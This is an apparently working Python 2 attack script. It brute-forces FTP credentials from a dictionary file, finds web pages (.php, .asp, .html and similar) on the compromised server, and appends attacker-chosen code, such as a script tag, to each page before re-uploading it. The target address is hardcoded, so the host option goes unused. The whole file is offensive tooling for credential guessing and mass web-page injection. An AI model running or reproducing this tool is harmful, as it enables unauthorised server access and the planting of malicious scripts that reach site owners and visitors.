#encoding:utf-8
import ftplib;
import os;
def InjectCode(FtpObj,Target,Code):
	try:
		print "\033[1;32;40m[+]Inject code target :"+Target;
		fp = open(Target+".tmp","w");
		FtpObj.retrlines("RETR "+Target,fp.write);
		fp.write(Code);
		fp.close()
		print "[+]Inject to file success";
		fp =open(Target+".tmp");
		FtpObj.storlines("STOR "+Target,fp);
		print "[+]upload ok";
		os.remove(Target+".tmp");
	except:
		print "\033[1;31;40m[-]Injecte error";
		None;

Web_ext=['.jsp','.asp','.aspx','.php','.html','.htm'];
def GetWebPages(FtpObj):
	Web_Pages=[];
	try:
		DirList = FtpObj.nlst();
		for FileName in DirList:
			if os.path.splitext(FileName)[1].lower() in Web_ext:
				Web_Pages.append(FileName);
				None;
			None;
		None;
	except:
		print "\033[1;31;40m[-]Get files list error";
		None;
	return Web_Pages;

def CheckUP(FtpObj,Dicfn):
	UserPwd = open(Dicfn,'r');
	for Row in UserPwd:
		try:
			User = Row.split(":")[0];
			Password = (Row.split(":")[1]).strip("\n").strip("\r");
			FtpObj.login(User,Password);
			print '[+]Success login password and user from"'+Dicfn+'"';
			return True;
		except Exception as e:
			#print '[-]Except:' + str(e);
			None;
		None;
	return False;
import optparse;
def Main(Args=None):
	parser = optparse.OptionParser('Usage: python Script.py -F < User&Password Dictionary> -H <Host> -C <InjectCode>');
	parser.add_option("-F","--File",help="User&password of dictionary content eg: admin:admin",type="string",dest="Dic");
	parser.add_option("-H",'--Host',dest="Host",type='string',help='host eg:192.168.1.2');
	parser.add_option("-C",'--Code',dest='Code',type='string',help='Code eg;<script>alert("Hi");</script>');
	(options,args)=parser.parse_args( (None if Args == None else Args) );
	Host=options.Host;
	Inj_Code = options.Code;
	Dicfn = options.Dic;
	if(Host==None or Inj_Code == None or Dicfn == None):
		print "Arguments error";
		exit(0);
	try:
		FtpObj = ftplib.FTP('192.168.0.103');
	except:
		print "\033[1;31;40m[-]Target serivce not exists";
		exit(0);
 	Success= CheckUP(FtpObj,Dicfn);
	if( not Success):
		print "\033[1;31;40m[-]Password or user not exists dictionary file ";
		exit(0);
	Web_Pages= GetWebPages(FtpObj);
	if(len(Web_Pages) == 0):
		print "\033[1;33;40m[-]Not exists extension ";
		exit(0);
	for Page in Web_Pages:
		InjectCode(FtpObj,Page,Inj_Code);
		None;
	print "\033[1;35;40m[!]Success Inject Code ";
	return 0;

ToolCall =None;
if __name__ == "__main__":
	Main();
else:
	ToolCall = Main;

